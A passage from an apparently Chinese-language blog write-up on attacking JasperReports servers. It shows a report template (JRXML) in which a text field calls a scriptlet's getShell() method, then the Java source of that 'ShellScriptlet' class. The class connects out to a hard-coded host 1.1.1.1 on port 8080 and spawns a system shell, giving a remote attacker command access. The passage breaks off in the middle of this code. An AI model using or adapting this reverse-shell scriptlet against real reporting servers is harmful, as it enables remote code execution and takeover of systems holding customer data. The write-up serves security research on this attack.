Logo"]]&gt;<span class="tag">&lt;/<span class="name">hyperlinkTooltipExpression</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">image</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">image</span> <span class="attr">scaleImage</span>=<span class="string">"Clip"</span> <span class="attr">hAlign</span>=<span class="string">"Right"</span> <span class="attr">vAlign</span>=<span class="string">"Middle"</span> <span class="attr">onErrorType</span>=<span class="string">"Icon"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">reportElement</span> <span class="attr">positionType</span>=<span class="string">"Float"</span> <span class="attr">x</span>=<span class="string">"265"</span> <span class="attr">y</span>=<span class="string">"71"</span> <span class="attr">width</span>=<span class="string">"250"</span> <span class="attr">height</span>=<span class="string">"70"</span> <span class="attr">uuid</span>=<span class="string">"4b5dd0d1-9011-42cf-ab07-f80c02d3d166"</span>/&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">imageExpression</span>&gt;</span>&lt;![CDATA["repo:AllAccounts_Res2"]]&gt;<span class="tag">&lt;/<span class="name">imageExpression</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">hyperlinkTooltipExpression</span>&gt;</span>&lt;![CDATA["Jaspersoft Logo"]]&gt;<span class="tag">&lt;/<span class="name">hyperlinkTooltipExpression</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">image</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">componentElement</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">reportElement</span> <span class="attr">key</span>=<span class="string">"table"</span> <span class="attr">x</span>=<span class="string">"0"</span> <span class="attr">y</span>=<span class="string">"0"</span> <span class="attr">width</span>=<span class="string">"515"</span> <span class="attr">height</span>=<span class="string">"70"</span> <span class="attr">uuid</span>=<span class="string">"db3dd84a-3743-43b3-ab7e-c4aebdb907df"</span>/&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">jr:table</span> <span class="attr">xmlns:jr</span>=<span class="string">"http://jasperreports.sourceforge.net/jasperreports/components"</span> <span class="attr">xsi:schemaLocation</span>=<span class="string">"http://jasperreports.sourceforge.net/jasperreports/components http://jasperreports.sourceforge.net/xsd/components.xsd"</span> <span class="attr">whenNoDataType</span>=<span class="string">"AllSectionsNoDetail"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">datasetRun</span> <span class="attr">subDataset</span>=<span class="string">"Table Dataset 1"</span> <span class="attr">uuid</span>=<span class="string">"3b2a079f-f600-46a6-a7af-720c4e939e7e"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">connectionExpression</span>&gt;</span>&lt;![CDATA[$P&#123;REPORT_CONNECTION&#125;]]&gt;<span class="tag">&lt;/<span class="name">connectionExpression</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">datasetRun</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">jr:columnGroup</span> <span class="attr">width</span>=<span class="string">"515"</span> <span class="attr">uuid</span>=<span class="string">"1e5d630a-c8f9-4dbb-8415-393f7624ca35"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">jr:groupHeader</span> <span class="attr">groupName</span>=<span class="string">"CityGroup"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">jr:cell</span> <span class="attr">height</span>=<span class="string">"30"</span> <span class="attr">rowSpan</span>=<span class="string">"1"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">textField</span> <span class="attr">isStretchWithOverflow</span>=<span class="string">"true"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">reportElement</span> <span class="attr">style</span>=<span class="string">"Sans_Bold"</span> <span class="attr">positionType</span>=<span class="string">"Float"</span> <span class="attr">mode</span>=<span class="string">"Opaque"</span> <span class="attr">x</span>=<span class="string">"0"</span> <span class="attr">y</span>=<span class="string">"14"</span> <span class="attr">width</span>=<span class="string">"515"</span> <span class="attr">height</span>=<span class="string">"16"</span> <span class="attr">isPrintWhenDetailOverflows</span>=<span class="string">"true"</span> <span class="attr">backcolor</span>=<span class="string">"#C0C0C0"</span> <span class="attr">uuid</span>=<span class="string">"aeafecc2-ef7e-435c-ae07-1f45ed6b179a"</span>/&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">box</span> <span class="attr">leftPadding</span>=<span class="string">"0"</span> <span class="attr">bottomPadding</span>=<span class="string">"0"</span> <span class="attr">rightPadding</span>=<span class="string">"0"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">bottomPen</span> <span class="attr">lineWidth</span>=<span class="string">"1.0"</span> <span class="attr">lineStyle</span>=<span class="string">"Solid"</span>/&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">box</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">textElement</span> <span class="attr">textAlignment</span>=<span class="string">"Left"</span>/&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">textFieldExpression</span>&gt;</span>&lt;![CDATA[" " + String.valueOf($V&#123;CityyNumber&#125;.intValue() + 1) + ". " + $F&#123;billing_address_city&#125;+ ", " + $F&#123;billing_address_country&#125;]]&gt;<span class="tag">&lt;/<span class="name">textFieldExpression</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">anchorNameExpression</span>&gt;</span>&lt;![CDATA[String.valueOf($F&#123;billing_address_city&#125;)]]&gt;<span class="tag">&lt;/<span class="name">anchorNameExpression</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">textField</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">jr:cell</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">jr:groupHeader</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">jr:column</span> <span class="attr">width</span>=<span class="string">"30"</span> <span class="attr">uuid</span>=<span class="string">"43ffff20-e89f-4f73-ad8d-878e9581274a"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">jr:columnHeader</span> <span class="attr">height</span>=<span class="string">"20"</span> <span class="attr">rowSpan</span>=<span class="string">"1"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">textField</span> <span class="attr">isStretchWithOverflow</span>=<span class="string">"true"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">reportElement</span> <span class="attr">style</span>=<span class="string">"PageHeader"</span> <span class="attr">positionType</span>=<span class="string">"Float"</span> <span class="attr">stretchType</span>=<span class="string">"RelativeToBandHeight"</span> <span class="attr">mode</span>=<span class="string">"Opaque"</span> <span class="attr">x</span>=<span class="string">"0"</span> <span class="attr">y</span>=<span class="string">"4"</span> <span class="attr">width</span>=<span class="string">"30"</span> <span class="attr">height</span>=<span class="string">"16"</span> <span class="attr">isPrintWhenDetailOverflows</span>=<span class="string">"true"</span> <span class="attr">uuid</span>=<span class="string">"a76dcb9c-8601-48bc-b9cc-3d1c316e537d"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"net.sf.jasperreports.export.pdf.tag.th"</span> <span class="attr">value</span>=<span class="string">"full"</span>/&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"net.sf.jasperreports.export.pdf.tag.colspan"</span> <span class="attr">value</span>=<span class="string">"1"</span>/&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">reportElement</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">textFieldExpression</span>&gt;</span>&lt;![CDATA[" "]]&gt;<span class="tag">&lt;/<span class="name">textFieldExpression</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">textField</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">jr:columnHeader</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">jr:detailCell</span> <span class="attr">height</span>=<span class="string">"20"</span> <span class="attr">rowSpan</span>=<span class="string">"1"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">textField</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">reportElement</span> <span class="attr">style</span>=<span class="string">"detail"</span> <span class="attr">positionType</span>=<span class="string">"Float"</span> <span class="attr">stretchType</span>=<span class="string">"RelativeToBandHeight"</span> <span class="attr">x</span>=<span class="string">"0"</span> <span class="attr">y</span>=<span class="string">"0"</span> <span class="attr">width</span>=<span class="string">"30"</span> <span class="attr">height</span>=<span class="string">"20"</span> <span class="attr">isPrintWhenDetailOverflows</span>=<span class="string">"true"</span> <span class="attr">uuid</span>=<span class="string">"73a40f28-2c08-4849-a2a9-b83ade7a6b7d"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"net.sf.jasperreports.export.pdf.tag.td"</span> <span class="attr">value</span>=<span class="string">"full"</span>/&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">reportElement</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">box</span> <span class="attr">topPadding</span>=<span class="string">"4"</span> <span class="attr">leftPadding</span>=<span class="string">"0"</span> <span class="attr">bottomPadding</span>=<span class="string">"0"</span> <span class="attr">rightPadding</span>=<span class="string">"10"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">bottomPen</span> <span class="attr">lineWidth</span>=<span class="string">"1.0"</span> <span class="attr">lineStyle</span>=<span class="string">"Solid"</span> <span class="attr">lineColor</span>=<span class="string">"#808080"</span>/&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">box</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">textElement</span> <span class="attr">textAlignment</span>=<span class="string">"Right"</span>/&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">textFieldExpression</span>&gt;</span>&lt;![CDATA[$V&#123;CityGroup_COUNT&#125;+"."]]&gt;<span class="tag">&lt;/<span class="name">textFieldExpression</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">textField</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">jr:detailCell</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">jr:column</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">jr:column</span> <span class="attr">width</span>=<span class="string">"240"</span> <span class="attr">uuid</span>=<span class="string">"d472eeed-282a-402b-9044-a397ca270655"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">jr:columnHeader</span> <span class="attr">height</span>=<span class="string">"20"</span> <span class="attr">rowSpan</span>=<span class="string">"1"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">textField</span> <span class="attr">isStretchWithOverflow</span>=<span class="string">"true"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">reportElement</span> <span class="attr">style</span>=<span class="string">"PageHeader"</span> <span class="attr">positionType</span>=<span class="string">"Float"</span> <span class="attr">stretchType</span>=<span class="string">"RelativeToBandHeight"</span> <span class="attr">mode</span>=<span class="string">"Opaque"</span> <span class="attr">x</span>=<span class="string">"0"</span> <span class="attr">y</span>=<span class="string">"4"</span> <span class="attr">width</span>=<span class="string">"240"</span> <span class="attr">height</span>=<span class="string">"16"</span> <span class="attr">isPrintWhenDetailOverflows</span>=<span class="string">"true"</span> <span class="attr">uuid</span>=<span class="string">"bd0d4582-5684-4e15-8623-b3f1940bf1bb"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"net.sf.jasperreports.export.pdf.tag.th"</span> <span class="attr">value</span>=<span class="string">"full"</span>/&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"net.sf.jasperreports.export.pdf.tag.colspan"</span> <span class="attr">value</span>=<span class="string">"2"</span>/&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">reportElement</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">box</span> <span class="attr">leftPadding</span>=<span class="string">"0"</span> <span class="attr">bottomPadding</span>=<span class="string">"0"</span> <span class="attr">rightPadding</span>=<span class="string">"0"</span>/&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">textFieldExpression</span>&gt;</span>&lt;![CDATA["Name"]]&gt;<span class="tag">&lt;/<span class="name">textFieldExpression</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">textField</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">jr:columnHeader</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">jr:detailCell</span> <span class="attr">style</span>=<span class="string">"detail"</span> <span class="attr">height</span>=<span class="string">"20"</span> <span class="attr">rowSpan</span>=<span class="string">"1"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">textField</span> <span class="attr">isStretchWithOverflow</span>=<span class="string">"true"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">reportElement</span> <span class="attr">style</span>=<span class="string">"detail"</span> <span class="attr">positionType</span>=<span class="string">"Float"</span> <span class="attr">stretchType</span>=<span class="string">"RelativeToBandHeight"</span> <span class="attr">x</span>=<span class="string">"0"</span> <span class="attr">y</span>=<span class="string">"0"</span> <span class="attr">width</span>=<span class="string">"240"</span> <span class="attr">height</span>=<span class="string">"20"</span> <span class="attr">isPrintWhenDetailOverflows</span>=<span class="string">"true"</span> <span class="attr">uuid</span>=<span class="string">"23562605-5611-41d8-8a40-98ad9d28834a"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"net.sf.jasperreports.export.pdf.tag.td"</span> <span class="attr">value</span>=<span class="string">"full"</span>/&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">reportElement</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">box</span> <span class="attr">topPadding</span>=<span class="string">"4"</span> <span class="attr">leftPadding</span>=<span class="string">"0"</span> <span class="attr">bottomPadding</span>=<span class="string">"0"</span> <span class="attr">rightPadding</span>=<span class="string">"5"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">bottomPen</span> <span class="attr">lineWidth</span>=<span class="string">"1.0"</span> <span class="attr">lineStyle</span>=<span class="string">"Solid"</span> <span class="attr">lineColor</span>=<span class="string">"#808080"</span>/&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">box</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">textFieldExpression</span>&gt;</span>&lt;![CDATA[$F&#123;name&#125;]]&gt;<span class="tag">&lt;/<span class="name">textFieldExpression</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">textField</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">jr:detailCell</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">jr:column</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">jr:column</span> <span class="attr">width</span>=<span class="string">"100"</span> <span class="attr">uuid</span>=<span class="string">"4612e5a3-cb0d-4533-9b54-9ad9828acbed"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">jr:columnHeader</span> <span class="attr">height</span>=<span class="string">"20"</span> <span class="attr">rowSpan</span>=<span class="string">"1"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">textField</span> <span class="attr">isStretchWithOverflow</span>=<span class="string">"true"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">reportElement</span> <span class="attr">style</span>=<span class="string">"PageHeader"</span> <span class="attr">positionType</span>=<span class="string">"Float"</span> <span class="attr">stretchType</span>=<span class="string">"RelativeToBandHeight"</span> <span class="attr">mode</span>=<span class="string">"Opaque"</span> <span class="attr">x</span>=<span class="string">"0"</span> <span class="attr">y</span>=<span class="string">"4"</span> <span class="attr">width</span>=<span class="string">"100"</span> <span class="attr">height</span>=<span class="string">"16"</span> <span class="attr">isPrintWhenDetailOverflows</span>=<span class="string">"true"</span> <span class="attr">uuid</span>=<span class="string">"d81f1db2-9f2e-4665-aa47-3d1a49cc9d15"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"net.sf.jasperreports.export.pdf.tag.th"</span> <span class="attr">value</span>=<span class="string">"full"</span>/&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">reportElement</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">box</span> <span class="attr">leftPadding</span>=<span class="string">"10"</span> <span class="attr">bottomPadding</span>=<span class="string">"0"</span> <span class="attr">rightPadding</span>=<span class="string">"0"</span>/&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">textFieldExpression</span>&gt;</span>&lt;![CDATA["Phone"]]&gt;<span class="tag">&lt;/<span class="name">textFieldExpression</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">textField</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">jr:columnHeader</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">jr:detailCell</span> <span class="attr">height</span>=<span class="string">"20"</span> <span class="attr">rowSpan</span>=<span class="string">"1"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">textField</span> <span class="attr">isStretchWithOverflow</span>=<span class="string">"true"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">reportElement</span> <span class="attr">style</span>=<span class="string">"detail"</span> <span class="attr">positionType</span>=<span class="string">"Float"</span> <span class="attr">stretchType</span>=<span class="string">"RelativeToBandHeight"</span> <span class="attr">x</span>=<span class="string">"0"</span> <span class="attr">y</span>=<span class="string">"0"</span> <span class="attr">width</span>=<span class="string">"100"</span> <span class="attr">height</span>=<span class="string">"20"</span> <span class="attr">isPrintWhenDetailOverflows</span>=<span class="string">"true"</span> <span class="attr">uuid</span>=<span class="string">"e48d7dee-a092-45ea-8bd8-8440f76a9fd0"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"net.sf.jasperreports.export.pdf.tag.td"</span> <span class="attr">value</span>=<span class="string">"full"</span>/&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">reportElement</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">box</span> <span class="attr">topPadding</span>=<span class="string">"4"</span> <span class="attr">leftPadding</span>=<span class="string">"0"</span> <span class="attr">bottomPadding</span>=<span class="string">"0"</span> <span class="attr">rightPadding</span>=<span class="string">"5"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">bottomPen</span> <span class="attr">lineWidth</span>=<span class="string">"1.0"</span> <span class="attr">lineStyle</span>=<span class="string">"Solid"</span> <span class="attr">lineColor</span>=<span class="string">"#808080"</span>/&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">box</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">textFieldExpression</span>&gt;</span>&lt;![CDATA[$F&#123;phone_office&#125;]]&gt;<span class="tag">&lt;/<span class="name">textFieldExpression</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">textField</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">jr:detailCell</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">jr:column</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">jr:column</span> <span class="attr">width</span>=<span class="string">"145"</span> <span class="attr">uuid</span>=<span class="string">"f0397b7d-4130-4b13-88b1-d89415b269bd"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">jr:columnHeader</span> <span class="attr">height</span>=<span class="string">"20"</span> <span class="attr">rowSpan</span>=<span class="string">"1"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">textField</span> <span class="attr">isStretchWithOverflow</span>=<span class="string">"true"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">reportElement</span> <span class="attr">style</span>=<span class="string">"PageHeader"</span> <span class="attr">positionType</span>=<span class="string">"Float"</span> <span class="attr">stretchType</span>=<span class="string">"RelativeToBandHeight"</span> <span class="attr">mode</span>=<span class="string">"Opaque"</span> <span class="attr">x</span>=<span class="string">"0"</span> <span class="attr">y</span>=<span class="string">"4"</span> <span class="attr">width</span>=<span class="string">"145"</span> <span class="attr">height</span>=<span class="string">"16"</span> <span class="attr">isPrintWhenDetailOverflows</span>=<span class="string">"true"</span> <span class="attr">uuid</span>=<span class="string">"0a1206b8-d0d6-4809-a424-3d7f09606b44"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"net.sf.jasperreports.export.pdf.tag.th"</span> <span class="attr">value</span>=<span class="string">"full"</span>/&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">reportElement</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">box</span> <span class="attr">leftPadding</span>=<span class="string">"0"</span> <span class="attr">bottomPadding</span>=<span class="string">"0"</span> <span class="attr">rightPadding</span>=<span class="string">"0"</span>/&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">textFieldExpression</span>&gt;</span>&lt;![CDATA["Address"]]&gt;<span class="tag">&lt;/<span class="name">textFieldExpression</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">textField</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">jr:columnHeader</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">jr:detailCell</span> <span class="attr">height</span>=<span class="string">"20"</span> <span class="attr">rowSpan</span>=<span class="string">"1"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">textField</span> <span class="attr">isStretchWithOverflow</span>=<span class="string">"true"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">reportElement</span> <span class="attr">style</span>=<span class="string">"detail"</span> <span class="attr">positionType</span>=<span class="string">"Float"</span> <span class="attr">stretchType</span>=<span class="string">"RelativeToBandHeight"</span> <span class="attr">x</span>=<span class="string">"0"</span> <span class="attr">y</span>=<span class="string">"0"</span> <span class="attr">width</span>=<span class="string">"145"</span> <span class="attr">height</span>=<span class="string">"20"</span> <span class="attr">isPrintWhenDetailOverflows</span>=<span class="string">"true"</span> <span class="attr">uuid</span>=<span class="string">"7bc63c7e-0224-441b-96ec-8a1bb67a0b84"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"net.sf.jasperreports.export.pdf.tag.td"</span> <span class="attr">value</span>=<span class="string">"full"</span>/&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">reportElement</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">box</span> <span class="attr">topPadding</span>=<span class="string">"4"</span> <span class="attr">leftPadding</span>=<span class="string">"0"</span> <span class="attr">bottomPadding</span>=<span class="string">"0"</span> <span class="attr">rightPadding</span>=<span class="string">"0"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">bottomPen</span> <span class="attr">lineWidth</span>=<span class="string">"1.0"</span> <span class="attr">lineStyle</span>=<span class="string">"Solid"</span> <span class="attr">lineColor</span>=<span class="string">"#808080"</span>/&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">box</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">textFieldExpression</span>&gt;</span>&lt;![CDATA[$F&#123;billing_address_street&#125;]]&gt;<span class="tag">&lt;/<span class="name">textFieldExpression</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">textField</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">jr:detailCell</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">jr:column</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">jr:columnGroup</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">jr:table</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">componentElement</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">band</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">summary</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">jasperReport</span>&gt;</span></div><div class="line"></div><div class="line">接下来看42行：</div><div class="line"><span class="tag">&lt;<span class="name">textFieldExpression</span>&gt;</span>&lt;![CDATA[$P&#123;ShellScriptlet_SCRIPTLET&#125;.getShell()]]&gt;<span class="tag">&lt;/<span class="name">textFieldExpression</span>&gt;</span></div><div class="line"></div><div class="line">这里我们调用一个getshell的方法在ShellScriptlet_SCRIPTLET。在35行我们定义了一个ShellScriptlet_SCRIPTLET 来引用“foxglove.shell.ShellScriptlet”中的Java代码。</div><div class="line"></div><div class="line"><span class="tag">&lt;<span class="name">scriptlet</span> <span class="attr">name</span>=<span class="string">"ShellScriptlet"</span> <span class="attr">class</span>=<span class="string">"foxglove.shell.ShellScriptlet"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">scriptletDescription</span>&gt;</span>&lt;![CDATA[]]&gt;<span class="tag">&lt;/<span class="name">scriptletDescription</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">scriptlet</span>&gt;</span></div></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div></pre></td><td class="code"><pre><div class="line">这很简单,但这在Java代码本身是如何定义的呢?</div><div class="line"></div><div class="line">编写攻击脚本</div><div class="line"></div><div class="line">scriptlet用Java编写,需要去扩展“JRDefaultScriptlet”。我从<span class="string">"here"</span>中借用了一些Java代码来反弹shell并且让这种攻击脚本成为跨平台的。下面就是结果了，要注意“host”和“port”的写法是固定的：</div><div class="line"></div><div class="line"><span class="keyword">package</span> foxglove.shell;</div><div class="line"><span class="keyword">import</span> java.io.*;</div><div class="line"><span class="keyword">import</span> java.net.*;</div><div class="line"><span class="keyword">import</span> java.io.InputStream;</div><div class="line"><span class="keyword">import</span> java.io.OutputStream;</div><div class="line"><span class="keyword">import</span> java.io.DataInputStream;</div><div class="line"><span class="keyword">import</span> net.sf.jasperreports.engine.JRDefaultScriptlet;</div><div class="line"><span class="keyword">import</span> net.sf.jasperreports.engine.JRScriptletException;</div><div class="line"> </div><div class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ShellScriptlet</span> <span class="keyword">extends</span> <span class="title">JRDefaultScriptlet</span> <span class="keyword">implements</span> <span class="title">Runnable</span></span>&#123;</div><div class="line">   Socket socket;</div><div class="line"> </div><div class="line">   PrintWriter socketWrite;</div><div class="line">   BufferedReader socketRead;</div><div class="line"> </div><div class="line">   PrintWriter commandWrite;</div><div class="line">   BufferedReader commandRead;</div><div class="line"> </div><div class="line">   <span class="keyword">static</span> String ip;</div><div class="line">   <span class="keyword">int</span> port = <span class="number">8080</span>;</div><div class="line"> </div><div class="line">   <span class="function"><span class="keyword">public</span> String <span class="title">getShell</span><span class="params">()</span></span>&#123;</div><div class="line">      ip = <span class="string">"1.1.1.1"</span>;</div><div class="line">      ShellScriptlet shell = <span class="keyword">new</span> ShellScriptlet();</div><div class="line">      shell.establishConnection();</div><div class="line">      <span class="keyword">new</span> Thread(shell).start();</div><div class="line">      shell.getCommand();</div><div class="line">      <span class="keyword">return</span> <span class="string">"DONE"</span>;</div><div class="line">   &#125;</div><div class="line"> </div><div class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span></span>&#123;</div><div class="line">      spawnShell();</div><div class="line">   &#125;</div><div class="line"> </div><div class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">spawnShell</span><span class="params">()</span></span>&#123;</div><div class="line">      <span class="keyword">boolean</span> windows = <span class="keyword">false</span>;</div><div class="line">      <span class="keyword">try</span>&#123;</div><div class="line">         <span class="keyword">if</span> ( System.getProperty(<span class="string">"os.name"</span>).toLowerCase().indexOf(<span class="string">"windows"</span>) != -<span class="number">1</span>)&#123;</div><div class="line">            windows = <span class="keyword">true</span>;</div><div class="line">         &#125;</div><div class="line"> </div><div class="line">         Runtime rt = Runtime.getRuntime();</div><div class="line">         Process p;</div><div class="line">         <span class="keyword">if</span>(windows) p = 